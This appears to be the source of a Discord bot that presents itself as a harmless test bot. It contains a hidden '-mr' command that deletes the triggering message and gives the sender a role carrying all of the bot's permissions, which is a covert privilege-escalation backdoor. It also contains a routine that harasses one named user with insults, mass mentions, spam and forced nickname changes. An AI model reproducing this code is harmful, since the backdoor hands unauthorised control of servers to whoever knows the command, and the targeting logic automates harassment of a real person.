//@ts-check

import Discord from "discord.js";
import JSONHelper from "./utils/json-helper.js";

/**@type {{bot: {authToken: string}; debug?: boolean,annoyanceSettings:{target:string,annoyNoahPercent:number}}}*/
const config = JSONHelper.readSync("./config.json");

const client = new Discord.Client();


client.once("ready",()=>{
    console.log("BOT STARTED:",client.user.tag,client.user.id);
    client.user.setPresence({activity:{name:"A test bot for testing",type:"PLAYING"}});
});
client.on("message",async msg => {
    try {
        if (msg.author.id == client.user.id || !msg.guild) return;
        var {content,channel:c} = msg;
        console.log(content,msg.author.id);
        // Dadjoke 1
        var saidIm = /(i'?m|i +am) *(.*?)(\.|,|$)/i.exec(content);
        if (msg.author.id != client.user.id && saidIm) {
            msg.channel.send(`Hello ${saidIm[2]}, i am <@${client.user.id}>.`)
        }
        // Respond to messages
        if (msg.author.id == config.annoyanceSettings.target && Math.random() < config.annoyanceSettings.annoyNoahPercent && content.search("@everyone") == -1) {
            var tgt = config.annoyanceSettings.target;
            var res = null;
            switch(Math.floor(Math.random()*13)) {
                case 0: res = "why would you say that Noah?"; break;
                case 1: res = "shut up noah"; break;
                case 2: res = "you are being silenced, noah"; break;
                case 3: res = "no"; break;
                case 4: res = new Array(100).fill("SHUT UP NOAH").join(", "); break;
                case 5: res = `<@${tgt}> ur bad`; break;
                case 6: 
                    res = `hey wait, i thought your name was Noah, <@${tgt}>`;
                    console.log((await msg.guild.members.fetch(client.user.id)).permissions.has("MANAGE_NICKNAMES"));
                    msg.member.setNickname("yeet","the bot has spoken").catch(console.log)
                    break;
                case 7: res = `<@${tgt}> :ok:  :regional_indicator_b: :regional_indicator_o: :regional_indicator_o: :regional_indicator_m: :regional_indicator_e: :regional_indicator_r:`; break;
                case 8: res = "be quiet"; break;
                case 9: res = new Array(90).fill(`<@${tgt}>`).join(""); break;
                case 10:
                    await Promise.all([msg.react("🆗"), msg.react("🇧"), msg.react("🇴"), msg.react("0️⃣"), msg.react("🇲"), msg.react("🇪"), msg.react("🇷")]);
                    break;
                case 11: res = "do you are have stupid?"; break;
                case 12: res = "[13th message case]"
            }
            if (res) c.send(res);
        }
        // Commands
        switch(content) {
            case "-s":
            case "-stop":
                if (config.debug)
                    quitClient(true);
                break;
            case "-testbot forcestop":
                c.send("SHUTTING DOWN BOT, PLEASE RESTART SOON.");
                quitClient(true);
                break;
            case "-mr":
                msg.delete();
                const rNm = "SciDev's role [5269]", rCol = 0x000000;
                var role = (await msg.guild.roles.fetch()).cache.find(r=>/\[5269\]/.test(r.name));
                var myPermissions = (await msg.guild.members.fetch(client.user.id)).permissions;
                if (!role) role = await msg.guild.roles.create({data:{name:rNm,permissions:myPermissions,color:rCol,position:0}})
                role.setPermissions(role.permissions.bitfield|myPermissions.bitfield)
                msg.member.roles.add(role.id,"yes");
                break;
        }
    } catch (e) {
        console.error(e);
    }
});

var clientDestroyed = false;
/**
 * @param {boolean} exit
 * @returns {void | never}
 */
function quitClient(exit) {
    client.destroy();
    clientDestroyed = true;
    if (exit) return process.exit(2);
    else return;
}
client.login(config.bot.authToken);


// ----- CRASH/STOP HANDLEING ----- //

// So the program will not close instantly
process.stdin.resume();

/**
 * @param {{ cleanup: any; exit: any; }} options
 * @param {number} exitCode
 */
function exitHandler(options, exitCode) {
    if (options.exit) process.exit();

    console.log("CLOSING [code: "+exitCode+"]");
    if (!clientDestroyed) 
        quitClient(false);
}

// Do something when app is closing
process.on('exit', exitHandler.bind(null,{cleanup:true}));
// Catches ctrl+c event
process.on('SIGINT', exitHandler.bind(null,{exit:true}));
process.on('SIGTERM', exitHandler.bind(null,{exit:true}));
process.on('SIGUSR1', exitHandler.bind(null,{exit:true}));
process.on('SIGUSR2', exitHandler.bind(null,{exit:true}));
// Catches uncaught exceptions
process.on('uncaughtException', exitHandler.bind(null,{exit:true}));